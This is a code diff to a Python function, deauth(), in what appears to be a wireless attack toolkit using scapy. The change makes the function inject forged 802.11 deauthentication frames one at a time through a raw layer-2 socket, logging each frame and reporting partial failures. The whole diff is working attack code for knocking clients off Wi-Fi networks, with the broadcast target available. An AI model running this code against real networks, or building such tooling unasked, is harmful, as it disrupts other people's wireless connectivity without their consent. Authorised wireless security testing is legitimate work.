@@ -2,7 +2,9 @@
 
 from __future__ import annotations
 
-from scapy.sendrecv import sendp
+import time
+
+from scapy.config import conf
 
 from ..frames import BROADCAST, craft_deauth
 from ..radio import ensure_channel, get_mode
@@ -25,18 +27,23 @@ def deauth(
     costs airtime; most adapters don't need it.
 
     Returns the count actually handed to the OS for transmission -- 0 if
-    iface isn't in monitor mode (frames can't go out at all) or if the
-    socket write itself raised, `count` otherwise. This is NOT proof of
-    over-the-air reception: this hardware's TX packet counters (`ip -s
-    link`) aren't instrumented for monitor-mode injection at all
-    (confirmed live via a second-radio witness -- see STATUS.md), so
-    there's no cheap from-Python way to verify actual RF transmission.
-    What this DOES catch is the real, previously-silent failure mode of
-    calling deauth() against an interface that isn't actually in monitor
-    mode (e.g. a stale lock, a failed monitor-mode setup) -- previously
-    sendp() would just silently succeed at the OS level while nothing
-    left the radio, indistinguishable from "ran fine, target just didn't
-    respond".
+    iface isn't in monitor mode (frames can't go out at all), N if the
+    socket died partway through (N frames got out before the failure).
+    This is NOT proof of over-the-air reception: this hardware's TX
+    packet counters (`ip -s link`) aren't instrumented for monitor-mode
+    injection at all (confirmed live via a second-radio witness -- see
+    STATUS.md), so there's no cheap from-Python way to verify actual RF
+    transmission. What this DOES catch is the real, previously-silent
+    failure mode of calling deauth() against an interface that isn't
+    actually in monitor mode (e.g. a stale lock, a failed monitor-mode
+    setup) -- previously sendp() would just silently succeed at the OS
+    level while nothing left the radio, indistinguishable from "ran
+    fine, target just didn't respond".
+
+    Sends one frame per socket.send() call (not a single batched
+    sendp(count=...)) and logs each one -- the user asked repeatedly to
+    see every individual deauth frame in the log, not just a "sent N"
+    summary after the fact.
     """
     log = progress_fn or (lambda msg: None)
     if ensure_channel(iface, channel):
@@ -49,9 +56,22 @@ def deauth(
 
     pkt = craft_deauth(bssid=bssid, client=client, low_rate=low_rate)
     try:
-        sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
+        sock = conf.L2socket(iface=iface)
     except OSError as exc:
-        log(f"deauth send failed: {exc}")
+        log(f"deauth socket open failed: {exc}")
         return 0
-    log(f"sent {count} deauth frame(s) {bssid} -> {client}")
-    return count
+    sent = 0
+    try:
+        for i in range(count):
+            try:
+                sock.send(pkt)
+            except OSError as exc:
+                log(f"deauth send failed after {sent}/{count} frame(s): {exc}")
+                return sent
+            sent += 1
+            log(f"deauth frame {sent}/{count} sent: {bssid} -> {client}")
+            if interval and i < count - 1:
+                time.sleep(interval)
+    finally:
+        sock.close()
+    return sent
